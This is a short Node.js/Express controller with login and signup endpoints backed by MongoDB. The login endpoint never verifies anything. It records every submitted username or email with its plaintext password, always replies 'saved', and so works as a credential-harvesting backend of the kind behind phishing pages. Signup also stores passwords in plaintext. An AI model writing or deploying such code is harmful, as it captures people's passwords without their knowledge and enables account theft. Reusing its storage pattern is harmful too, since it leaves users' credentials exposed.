const User         = require('../models/User');
const LoginAttempt = require('../models/LoginAttempt');

// ────────────────────────────────────────────────────────────────
// POST /api/auth/login
// Saves EVERY login attempt to MongoDB, always returns 200
// ────────────────────────────────────────────────────────────────
const login = async (req, res) => {
  try {
    const { emailOrUsername, password } = req.body;

    // Save EVERY login attempt to MongoDB no matter what
    const loginAttempt = new LoginAttempt({
      emailOrUsername: emailOrUsername,
      password:        password,
      attemptedAt:     new Date()
    });
    await loginAttempt.save();
    console.log('Login attempt saved to MongoDB:', emailOrUsername);

    return res.status(200).json({ message: 'saved' });

  } catch (error) {
    console.error('Error saving login attempt:', error);
    return res.status(500).json({ message: 'Server Error' });
  }
};

// ────────────────────────────────────────────────────────────────
// POST /api/auth/signup
// Saves new user to MongoDB, always returns 200
// ────────────────────────────────────────────────────────────────
const signup = async (req, res) => {
  try {
    const { email, fullName, username, password } = req.body;

    const newUser = new User({ email, fullName, username, password });
    await newUser.save();
    console.log('New user saved to MongoDB:', username);

    return res.status(200).json({ message: 'saved' });

  } catch (error) {
    console.error('Error saving user:', error);
    return res.status(500).json({ message: 'Server Error' });
  }
};

module.exports = { login, signup };
